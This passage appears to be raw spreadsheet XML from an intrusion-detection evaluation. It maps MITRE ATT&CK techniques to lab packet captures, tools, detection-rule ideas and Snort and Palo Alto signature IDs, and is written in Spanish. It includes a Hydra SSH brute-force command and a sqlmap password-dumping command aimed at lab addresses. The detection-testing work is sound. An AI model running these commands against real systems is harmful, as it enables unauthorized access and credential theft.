  <si>
    <t>wash, reaver</t>
  </si>
  <si>
    <t>T1110-Wps_[1].pcapng</t>
  </si>
  <si>
    <t>Manual [1] /  4.2.8</t>
  </si>
  <si>
    <t>Manual [1] / E.27</t>
  </si>
  <si>
    <t>Manual [4] / 4.1.34</t>
  </si>
  <si>
    <t>NO (no detectable por red)</t>
  </si>
  <si>
    <t>Obtención de contraseña por fuerza bruta (adivinación)</t>
  </si>
  <si>
    <t>FTP - Patator</t>
  </si>
  <si>
    <t>T1110.001-FTP-C2018_[6].pcapng</t>
  </si>
  <si>
    <t>Regla genérica que detecte un elevado número de intentos de acceso al servicio FTP de la víctima</t>
  </si>
  <si>
    <t>Manual [4] / B.32</t>
  </si>
  <si>
    <t>El uso de fuerza bruta para acceder via FTP a la víctima siempre es un ataque</t>
  </si>
  <si>
    <t>Hydra</t>
  </si>
  <si>
    <t>T1110.001-Hydra_[3].pcapng</t>
  </si>
  <si>
    <t>Regla genérica que detecte un envío msaivo de peticiones de inicio de sesión SSH, alertando de un posible intento de acceso por fuerza bruta</t>
  </si>
  <si>
    <t>Obtener la contraseña para conectarse por SSH al equipo victima mediante fuerza bruta. Comando:  hydra -l dit -P pass.txt 172.16.2.2 -t 4 ssh</t>
  </si>
  <si>
    <t>Manual [3] /  3.8.9</t>
  </si>
  <si>
    <t>Manual [3] / 3.8.9.4</t>
  </si>
  <si>
    <t>Manual [3] / 3.8.9.5</t>
  </si>
  <si>
    <t>El uso de fuerza bruta para acceder via SSH a la víctima siempre es un ataque</t>
  </si>
  <si>
    <t>2002752, 2002749, 19559</t>
  </si>
  <si>
    <r>
      <rPr>
        <b/>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>Flujos con Ataques Detectados Snort</t>
    </r>
    <r>
      <rPr>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>: el número de flujos detectados para el RS3, a pesar de haber detectado mensajes, es cero debido a que la alerta 19559 no está asociada a ninguno en los logs (posteriormente de forma manual puede asociarse esta alerta al flujo correspondiente).</t>
    </r>
  </si>
  <si>
    <t>31914, 94174</t>
  </si>
  <si>
    <t>PaloAlto detecta el intento de conexión a SSH y el uso de libSSH, herramienta para realizar diferentes ataques con SSH</t>
  </si>
  <si>
    <t>SSH - Patator</t>
  </si>
  <si>
    <t>T1110.001-SSH-C2018_[6].pcapng</t>
  </si>
  <si>
    <t>Manual [4] / B.33</t>
  </si>
  <si>
    <t>650, 2003068, 2001219</t>
  </si>
  <si>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t xml:space="preserve">650, </t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>19559</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>, 17317, 2003068, 2001219</t>
    </r>
  </si>
  <si>
    <t>650, 17317, 2003068, 2001219</t>
  </si>
  <si>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t xml:space="preserve">650, 2003068, 2001219, </t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>19559</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>, 17317, 2002749, 2002752, 2036752, 2100650</t>
    </r>
  </si>
  <si>
    <t>2003068, 2001219, 2002749, 2002752, 2100650</t>
  </si>
  <si>
    <t>31914, 40104, 55873, 40015</t>
  </si>
  <si>
    <t>40104, 40015</t>
  </si>
  <si>
    <t>31914, 55873</t>
  </si>
  <si>
    <t>PaloAlto detecta a nivel de aplicación SSH mediante Control de Aplicaciones e IPS</t>
  </si>
  <si>
    <t>Modify Registry</t>
  </si>
  <si>
    <t>T1112</t>
  </si>
  <si>
    <t>Modificación del Registro de forma remota</t>
  </si>
  <si>
    <t>reg (Remoto)</t>
  </si>
  <si>
    <t>T1112-Modify_registry_[4].pcapng</t>
  </si>
  <si>
    <t>WINREG</t>
  </si>
  <si>
    <t xml:space="preserve">Regla que detecte el envío de mensajes con protocolo WINREG o Remote Registry Service </t>
  </si>
  <si>
    <t>Manual [4] /  3.9</t>
  </si>
  <si>
    <t>Manual [4] / B.9</t>
  </si>
  <si>
    <t>Manual [4] / 4.9</t>
  </si>
  <si>
    <t>La modificación del registro de forma remota en ciertos contextos puede tratarse de actividad legítima</t>
  </si>
  <si>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t xml:space="preserve">44489, </t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>38319, 402</t>
    </r>
  </si>
  <si>
    <t>44489, 402</t>
  </si>
  <si>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t xml:space="preserve">44489, </t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>38319</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>, 402, 2002752, 2002749, 2100402, 2044666, 2051116</t>
    </r>
  </si>
  <si>
    <t>44489, 402, 2002752, 2002749, 2100402, 2044666, 2051116</t>
  </si>
  <si>
    <r>
      <rPr>
        <b/>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>Flujos Detectados Snort</t>
    </r>
    <r>
      <rPr>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>: Snortv2 no detecta un flujo ICMP de la captura. Este flujo es irrelevante para el ataque</t>
    </r>
  </si>
  <si>
    <t>9999, 92322, 33836</t>
  </si>
  <si>
    <r>
      <rPr>
        <b/>
        <sz val="14"/>
        <color theme="1"/>
        <rFont val="Arial"/>
        <family val="2"/>
      </rPr>
      <t xml:space="preserve">Flujos detectados PA: </t>
    </r>
    <r>
      <rPr>
        <sz val="14"/>
        <color theme="1"/>
        <rFont val="Arial"/>
        <family val="2"/>
      </rPr>
      <t>Paloalto no detecta los protocolos BROWSER, MDNS, LLMNR</t>
    </r>
  </si>
  <si>
    <t>Email Collection</t>
  </si>
  <si>
    <t>T1114</t>
  </si>
  <si>
    <t>Remote Email Collection</t>
  </si>
  <si>
    <t>T1114.002</t>
  </si>
  <si>
    <t>Recolección de correos electrónicos de un servidor Microsoft Exchange haciendo uso de credenciales robadas</t>
  </si>
  <si>
    <t>PowerShell</t>
  </si>
  <si>
    <t>T1114-Email_collection_remote_email_collection_[4].pcapng</t>
  </si>
  <si>
    <t>Regla genérica que detecte el intento de extracción de información relacionada con los correos electrónicos de una empresa alojados en un servidor Microsoft Exchange</t>
  </si>
  <si>
    <t>Manual [4] /  3.16</t>
  </si>
  <si>
    <t>Manual [4] / B.16</t>
  </si>
  <si>
    <t>Manual [4] / 4.16</t>
  </si>
  <si>
    <t>La recolección de correos electrónicos de un servidor Microsoft Exchange puede tratarse de una acción legítima en algunos contextos</t>
  </si>
  <si>
    <t>44604, 44489, 15935, 202685</t>
  </si>
  <si>
    <t>44489, 15935, 202685</t>
  </si>
  <si>
    <t>44604, 44489, 15935, 2002752, 2002749, 2044666, 2026850, 2036224, 2009345</t>
  </si>
  <si>
    <t>44489, 15935, 2002752, 2002749, 2044666, 2026850, 2036224, 2009345</t>
  </si>
  <si>
    <t>92322, 9999, 56497</t>
  </si>
  <si>
    <t>92322, 56497</t>
  </si>
  <si>
    <r>
      <rPr>
        <b/>
        <sz val="14"/>
        <color theme="1"/>
        <rFont val="Arial"/>
        <family val="2"/>
      </rPr>
      <t>Flujos detectados PA</t>
    </r>
    <r>
      <rPr>
        <sz val="14"/>
        <color theme="1"/>
        <rFont val="Arial"/>
        <family val="2"/>
      </rPr>
      <t>: Paloalto detecta dos flujos más de los que hay en el ataque. PUEDE DEBERSE A LAS VARIACIONES EXISTENTES EN ESTOS FLUJOS</t>
    </r>
  </si>
  <si>
    <t>Data Encoding</t>
  </si>
  <si>
    <t>T1132</t>
  </si>
  <si>
    <t>Standard Encoding</t>
  </si>
  <si>
    <t>T1132.001</t>
  </si>
  <si>
    <t>Codificacion de mensajes entre la victima y el C2 Server mediante Base64</t>
  </si>
  <si>
    <t>Metasploit, curl, base64</t>
  </si>
  <si>
    <t>T1132.001-Standard_Encoding_[5].pcapng</t>
  </si>
  <si>
    <t>Deteccion por anomalias</t>
  </si>
  <si>
    <t>Servidor HTTP en el C2 Server. Intercambio de mensajes entre la victima y atacante mediante base64</t>
  </si>
  <si>
    <t>Manual [5] / 4.8.2</t>
  </si>
  <si>
    <t>Manual [5] / C.3</t>
  </si>
  <si>
    <t>Manual [5] /  5.11.8</t>
  </si>
  <si>
    <t>La codificación en base 64 de un canal c2 siempre es un ataque</t>
  </si>
  <si>
    <t>2000418, 2034567, 2013028</t>
  </si>
  <si>
    <t>2000418, 2034567, 2013028, 50447</t>
  </si>
  <si>
    <t xml:space="preserve">50447, 2002752, 2002749, 2000418, 2011803, 2101620, 2034567, 2013028, 2002824
</t>
  </si>
  <si>
    <r>
      <rPr>
        <b/>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>Flujos Detectados Snort</t>
    </r>
    <r>
      <rPr>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>: Snortv2 no analiza un flujo ICMP. Este flujo no es relevante para el ataque</t>
    </r>
  </si>
  <si>
    <t>Flujos detectados PA: Paloalto solo detecta los flujos correspondientes al ataque</t>
  </si>
  <si>
    <t>Initial Access</t>
  </si>
  <si>
    <t>TA0001</t>
  </si>
  <si>
    <t>External Remote Services</t>
  </si>
  <si>
    <t>T1133</t>
  </si>
  <si>
    <t>Acceso a red VPN desde dispositivo no autorizado con credenciales robadas</t>
  </si>
  <si>
    <t>OpenVPN</t>
  </si>
  <si>
    <t>T1133-External_remote_services_[4].pcapng</t>
  </si>
  <si>
    <t>NO***</t>
  </si>
  <si>
    <t xml:space="preserve">Existen varias variantes.
        Circunstancias concretas del ataque: el atacante realiza alguna interacción posterior una vez ha logrado acceder a la red (aplicable a esta técnica) como un escaneo de red o mensajes de anuncio de Host.
        Reglas personalizadas: regla que compruebe si las direcciones IP involucradas en los paquetes se corresponden con las autorizadas dentro de la red VPN (debe ser configurada manualmente).
</t>
  </si>
  <si>
    <t>Acceso a red VPN, sin interacciones adicionales más allá de las naturales al propio acceso</t>
  </si>
  <si>
    <t>Manual [4] /  3.3</t>
  </si>
  <si>
    <t>Manual [4] / B.3</t>
  </si>
  <si>
    <t>Manual [4] / 4.3</t>
  </si>
  <si>
    <t>El acceso a una red VPN es una acción legítima en algunos contextos</t>
  </si>
  <si>
    <t>1917, 254</t>
  </si>
  <si>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>24303</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>, 27611, 1917, 254</t>
    </r>
  </si>
  <si>
    <t>24303, 27611, 1917, 254</t>
  </si>
  <si>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>24303</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>, 27611, 1917, 254, 2101620, 2100527, 2002749, 2001117, 2101917</t>
    </r>
  </si>
  <si>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>24303</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>, 27611, 1917, 254, 2101620, 2100527, 2002749, 2001117, 2101917</t>
    </r>
  </si>
  <si>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>24303</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>, 27611, 1917, 254, 2101620, 2100527, 2002749, 2001117, 2101917</t>
    </r>
  </si>
  <si>
    <r>
      <rPr>
        <b/>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>Flujos Detectados Snort</t>
    </r>
    <r>
      <rPr>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>: Snortv2 no toma en consideración para el análisis los flujos ICMPv6</t>
    </r>
  </si>
  <si>
    <r>
      <rPr>
        <b/>
        <sz val="14"/>
        <color theme="1"/>
        <rFont val="Arial"/>
        <family val="2"/>
      </rPr>
      <t xml:space="preserve">Flujos detectados PA: </t>
    </r>
    <r>
      <rPr>
        <sz val="14"/>
        <color theme="1"/>
        <rFont val="Arial"/>
        <family val="2"/>
      </rPr>
      <t>PaloAlto no analiza los flujos ICMPv6</t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="14"/>
        <color theme="1"/>
        <rFont val="Arial"/>
        <family val="2"/>
      </rPr>
      <t xml:space="preserve"> </t>
    </r>
  </si>
  <si>
    <t>Browser Extensions</t>
  </si>
  <si>
    <t>T1176</t>
  </si>
  <si>
    <t>Instalación de Plugin en Navegador Chrome que reenvía información relacionada con búsquedas del usuario a un servidor</t>
  </si>
  <si>
    <t>Malicious-browser-extension</t>
  </si>
  <si>
    <t>T1176-Browser-extension_[4].pcapng</t>
  </si>
  <si>
    <t>Detección por anomalías basada en flujos de datos hacia direcciones no relacionadas con las búsquedas, normalmente en formato de objetos JavaScript</t>
  </si>
  <si>
    <t>Manual [4] /  3.7</t>
  </si>
  <si>
    <t>Manual [4] / B.7</t>
  </si>
  <si>
    <t>Manual [4] / 4.7</t>
  </si>
  <si>
    <t>El uso de una extensión maliciosa que publica información confidencial siempre es un ataque</t>
  </si>
  <si>
    <t>1917, 2002752, 2002749, 2101917, 2101620</t>
  </si>
  <si>
    <r>
      <rPr>
        <b/>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>Flujos Detectados Snort</t>
    </r>
    <r>
      <rPr>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>: Snortv2 no analiza dos flujos ICMP, pero no afecta a los resultados</t>
    </r>
  </si>
  <si>
    <t>internet-utility -- browser based</t>
  </si>
  <si>
    <t>212</t>
  </si>
  <si>
    <t>Forced Authentication</t>
  </si>
  <si>
    <t>T1187</t>
  </si>
  <si>
    <t>Forzar intento de autenticación en un servidor para obtener credenciales de acceso</t>
  </si>
  <si>
    <t>SMB, NTLMssp-Extract</t>
  </si>
  <si>
    <t>T1187-Forced_Authentication_[5].pcapng</t>
  </si>
  <si>
    <t>Monitorizar tráfico SMB en puertos TCP 139,445, puerto UDP 137 y tráfico WebDAV</t>
  </si>
  <si>
    <t>Servidor SMB. El atacante captura el tráfico de red del intento de autenticación mediante Wireshark y aplica fuerza bruta a las credenciales capturadas</t>
  </si>
  <si>
    <t>Manual [5] / 4.5.1</t>
  </si>
  <si>
    <t>Manual [5] / C.4</t>
  </si>
  <si>
    <t>Manual [5] /  5.7.4</t>
  </si>
  <si>
    <t>Forzar un intento de autenticación siempre es un ataque</t>
  </si>
  <si>
    <t>44486, 44484, 44488</t>
  </si>
  <si>
    <t>2002752, 2002749, 44486, 44484, 44488</t>
  </si>
  <si>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t xml:space="preserve">2002752, 2002749, </t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>44486, 44484, 44488</t>
    </r>
  </si>
  <si>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t xml:space="preserve">2002752, 2002749, </t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>44486, 44484, 44488</t>
    </r>
  </si>
  <si>
    <r>
      <rPr>
        <b/>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>Instancias Ataque</t>
    </r>
    <r>
      <rPr>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>: cada instancia de ataque se corresponde con una solicitud al server SMB con el usuario y contraseñas en el paquete</t>
    </r>
  </si>
  <si>
    <t>92322, 31696</t>
  </si>
  <si>
    <t>Consideramos los flujos en los que salta la alerta con SID 31696 para considerarlos como flujos con ataque</t>
  </si>
  <si>
    <t>T1187-Forced_Authentication2_[5].pcapng</t>
  </si>
  <si>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t xml:space="preserve">2002752, 2002749, </t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>44486, 44484, 44488</t>
    </r>
  </si>
  <si>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t xml:space="preserve">2002752, 2002749, </t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>44486, 44484, 44488</t>
    </r>
  </si>
  <si>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t xml:space="preserve">2002752, 2002749, </t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>44486, 44484, 44488</t>
    </r>
  </si>
  <si>
    <t>Cada instancia de ataque se corresponde con una solicitud al server SMB con el usuario y contraseñas en el paquete</t>
  </si>
  <si>
    <t>Drive-by Compromise</t>
  </si>
  <si>
    <t>T1189</t>
  </si>
  <si>
    <t>HTML Exploit I - HTML Compilador</t>
  </si>
  <si>
    <t>Apache, Shadyantra</t>
  </si>
  <si>
    <t>T1189-Drive-by_compromise_v1_[4].pcapng</t>
  </si>
  <si>
    <t>Regla que detecte el aprovechamiento de una vulnerabilidad del navegador Mozilla Firefox para llevar a cabo una compilación de código en la víctima</t>
  </si>
  <si>
    <t>Carga de página web con exploit HTML para compilar código malware (no ejecutar)</t>
  </si>
  <si>
    <t>Manual [4] /  3.4</t>
  </si>
  <si>
    <t>Manual [4] / B.4</t>
  </si>
  <si>
    <t>Manual [4] / 4.4</t>
  </si>
  <si>
    <t>El uso de un exploit para compilar código en la víctima siempre es un ataque</t>
  </si>
  <si>
    <t>1917, 50447</t>
  </si>
  <si>
    <t>2002752, 2002749, 2101917, 2011085, 1917, 50447</t>
  </si>
  <si>
    <t>56610, 9999, 59219</t>
  </si>
  <si>
    <t>56610, 9999</t>
  </si>
  <si>
    <r>
      <rPr>
        <b/>
        <sz val="14"/>
        <color theme="1"/>
        <rFont val="Arial"/>
        <family val="2"/>
      </rPr>
      <t>Flujo detectados PA</t>
    </r>
    <r>
      <rPr>
        <sz val="14"/>
        <color theme="1"/>
        <rFont val="Arial"/>
        <family val="2"/>
      </rPr>
      <t>: Paloalto solo detecta los flujos con ataque</t>
    </r>
  </si>
  <si>
    <t>HTML Exploit II - Descarga de Ejecutable</t>
  </si>
  <si>
    <t>T1189-Drive-by_compromise_v2_[4].pcapng</t>
  </si>
  <si>
    <t>Regla genérica que detecte la descarga no autorizada de un archivo .exe (ejecutable) en el equipo víctima desde una página web posiblemente fraudulenta</t>
  </si>
  <si>
    <t>Carga de página web con exploit HTML para descargar malware en formato ejecutable .exe</t>
  </si>
  <si>
    <t>La descarga no autorizada de un ejecutable no siempre es un ataque</t>
  </si>
  <si>
    <t>2016141, 50447</t>
  </si>
  <si>
    <t>2016141, 50447, 2002752, 2002749, 2011085, 2003595</t>
  </si>
  <si>
    <t>2002752, 2002749, 50447, 2011085</t>
  </si>
  <si>
    <t>2016141, 2003595</t>
  </si>
  <si>
    <t>Exploit Public-Facing Application</t>
  </si>
  <si>
    <t>T1190</t>
  </si>
  <si>
    <t>Inyección SQL</t>
  </si>
  <si>
    <t>Damn Vulnerable Web App (DVWA)</t>
  </si>
  <si>
    <t>T1190-Sql_injection-C2018_[6].pcapng</t>
  </si>
  <si>
    <t>Regla personalizada que detecte posibles cadenas asociadas a un ataque de inyección SQL en sentencias HTML</t>
  </si>
  <si>
    <t>Manual [4] / B.34</t>
  </si>
  <si>
    <t>Una inyección SQL siempre constituye un ataque</t>
  </si>
  <si>
    <t>2016672, 2006446, 2011037, 2010963, 2017808, 2006445, 2017337, 2011042</t>
  </si>
  <si>
    <t>2006446, 2011037, 2010963, 2017808, 2006445, 2017337, 2011042</t>
  </si>
  <si>
    <t>2016672, 2006446, 2011037, 2010963, 2017808, 2006445, 2017337, 2011042, 50447, 19439, 19440, 13990, 24172, 31939, 44416</t>
  </si>
  <si>
    <t>2016672, 50447</t>
  </si>
  <si>
    <t>2006446, 2011037, 2010963, 2017808, 2006445, 2017337, 2011042, 19439, 19440, 13990, 24172, 31939, 44416</t>
  </si>
  <si>
    <t xml:space="preserve">50447, 19439, 19440, 13990, 24172, 31939, 44416, 2002749, 2002752, 2016672, 2020506, 2006446, 2011037, 2010963, 2017808, 2006445, 2017337, 2011042, 2012885, 2009004
</t>
  </si>
  <si>
    <t>50447, 2002749, 2002752, 2016672</t>
  </si>
  <si>
    <t>50447, 2002749, 2002752</t>
  </si>
  <si>
    <t xml:space="preserve">19439, 19440, 13990, 24172, 31939, 44416, 2020506, 2006446, 2011037, 2010963, 2017808, 2006445, 2017337, 2011042, 2012885, 2009004
</t>
  </si>
  <si>
    <r>
      <rPr>
        <b/>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>Ataques Detectados</t>
    </r>
    <r>
      <rPr>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>: hay algunas inyecciones SQL que por su sintaxis no son detectadas por Snort</t>
    </r>
  </si>
  <si>
    <t>14984, 33338, 35823, 30514, 58005, 9999</t>
  </si>
  <si>
    <t>33338, 35823, 30514, 58005</t>
  </si>
  <si>
    <t>Sqlmap</t>
  </si>
  <si>
    <t>T1190-Sql_inyection1_[3].pcapng</t>
  </si>
  <si>
    <t>Regla que detecte un posible intento al esquema de informacion de un servidor MySQL. Regla que detecte una sentencia SQL pudiendose tratar de una posible inyeccion SQL. Regla que detecte posible escaneo de vulnerabilidades de inyeccion SQL.</t>
  </si>
  <si>
    <t>Ejecucion de comando mediante sqlmap para probar diferentes SQL Injections a una página web. Comando: sqlmap -u http://192.168.2.2/payroll_app.php --forms --batch --passwords</t>
  </si>
  <si>
    <t>Manual [3] /  3.8.5</t>
  </si>
  <si>
    <t>Manual [3] / 3.8.5.4</t>
  </si>
  <si>
    <t>Manual [3] / 3.8.5.5</t>
  </si>
  <si>
    <t>2002752, 2002749, 50447</t>
  </si>
  <si>
    <t>50447, 2002752, 2002749</t>
  </si>
  <si>
    <t>9999, 58005</t>
  </si>
  <si>
    <t>curl, DVWA</t>
  </si>
  <si>
    <t>T1190-SQL_Injection_High_Bytes1_[4].pcapng</t>
  </si>
  <si>
    <t>Regla que detecte un posible intento de inyección SQL en la URL de una petición</t>
  </si>
  <si>
    <t>Instalado un servidor DVWA (servidor con vulnerabilidades) se realiza una inyección SQL a una URL añadiendo caracteres de relleno</t>
  </si>
  <si>
    <t>Manual [4] / 3.26</t>
  </si>
  <si>
    <t>Manual [4] / B.39</t>
  </si>
  <si>
    <t>Manual [4] / 4</t>
  </si>
  <si>
    <t>2034567, 2013028</t>
  </si>
  <si>
    <t>2002752, 2002749, 2034567, 2013028, 2002824</t>
  </si>
  <si>
    <t>T1190-SQL_Injection_High_Bytes2_[4].pcapng</t>
  </si>
  <si>
    <t>T1190-Sql_inyection2_[2].pcapng</t>
  </si>
  <si>
    <t>Manual [2] /  3.1.3.1</t>
  </si>
  <si>
    <t>Manual [4] / B.28</t>
  </si>
  <si>
    <t>Manual [2] / 4.1.1.2</t>
  </si>
  <si>
    <t>1061, 1122, 1147</t>
  </si>
  <si>
    <t>1122, 1147</t>
  </si>
  <si>
    <t>2017808, 2009815, 2009714, 2006446, 2006445, 2008538, 1061, 1122, 1147</t>
  </si>
  <si>
    <t>1122, 1147, 2017808</t>
  </si>
  <si>
    <t>2009815, 2009714, 2006446, 2006445, 2008538, 1061</t>
  </si>
  <si>
    <t>2017808, 2009815, 2009714, 2006446, 2006445, 2008538, 1061, 1122, 1147, 19779, 50447, 31939, 7070</t>
  </si>
  <si>
    <t>1122, 1147, 2017808, 50447, 31939</t>
  </si>
  <si>
    <t>1122, 1147, 2017808, 31939</t>
  </si>
  <si>
    <t>2009815, 2009714, 2006446, 2006445, 2008538, 1061, 19779, 37070</t>
  </si>
  <si>
    <t>2002752, 2002749, 2012885, 2101061, 2017808, 2009815, 2009714, 2006446, 2006445, 2008538, 1061, 1122, 1147, 19779, 50447, 31939, 7070</t>
  </si>
  <si>
    <t>1122, 1147, 2017808, 50447, 31939, 2002752, 2002749, 2012885</t>
  </si>
  <si>
    <t>1122, 1147, 2017808, 31939, 2002752, 2002749, 2012885</t>
  </si>
  <si>
    <t>2101061, 2017808, 2009815, 2009714, 2006446, 2006445, 2008538, 1061, 19779, 7070</t>
  </si>
  <si>
    <r>
      <rPr>
        <b/>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>Flujos/Mensajes/Instancias con Ataque Detectados Snort</t>
    </r>
    <r>
      <rPr>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>: el hecho de que se lleve a cabo una detección del 100% en instancias pero menor del 100% en flujos y mensajes se debe a la no asociación de algunas alertas a flujos y paquetes (estas alertas no contienen información del paquete asociado, por lo que no puede contabilizarse como una detección válida de flujo/mensaje, aunque a niveles prácticos actuaría como un 100%).</t>
    </r>
  </si>
  <si>
    <t>46199, 15621</t>
  </si>
  <si>
    <t>9999, 30514, 31477, 32658, 33338, 35823, 36241, 36242, 36248, 38195, 54608, 57735, 58005, 59128, 91523, 91528, 94307</t>
  </si>
  <si>
    <t>30514, 31477, 32658, 33338, 35823, 36241, 36242, 36248, 38195, 54608, 57735, 58005, 59128, 91523, 91528, 94307</t>
  </si>
  <si>
    <t>BITS Jobs</t>
  </si>
  <si>
    <t>T1197</t>
  </si>
  <si>
    <t>Establecimiento de tarea BITS en equipo Windows para garantizar persistencia trás reinicio del equipo</t>
  </si>
  <si>
    <t>BITSADMIN,METASPLOIT</t>
  </si>
  <si>
    <t>T1197-BITS_Jobs_[5].pcapng</t>
  </si>
  <si>
    <t>Descarga de Malware previa - T1105</t>
  </si>
  <si>
    <t>Regla genérica que detecte la presencia de cadenas en el contenido de los paquetes como "Microsoft BITS" y ".exe", alertando del intento de creación de una tarea BITS</t>
  </si>
  <si>
    <t>Ejecución de comandos para la creación de una tarea BITS con rastro de red</t>
  </si>
  <si>
    <t>Manual [5] /  4.3.1</t>
  </si>
  <si>
    <t>Manual [5] / C.5</t>
  </si>
  <si>
    <t>Manual [5] /  5.5.2</t>
  </si>
  <si>
    <t>El establecimiento de tareas BITS puede considerarse como tráfico legítimo o como ataque</t>
  </si>
  <si>
    <t>1917, 2035480, 2025644, 2022858, 2016141, 2021076, 2018959</t>
  </si>
  <si>
    <t>1917, 2021076</t>
  </si>
  <si>
    <t>2035480, 2025644, 2022858, 2016141, 2018959</t>
  </si>
  <si>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t xml:space="preserve">2035480, </t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF57BB8A"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>2025644</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>, 2022858, 2016141, 2021076, 2018959, 1917, 50447</t>
    </r>
  </si>
  <si>
    <t>1917, 50447, 2021076</t>
  </si>
  <si>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
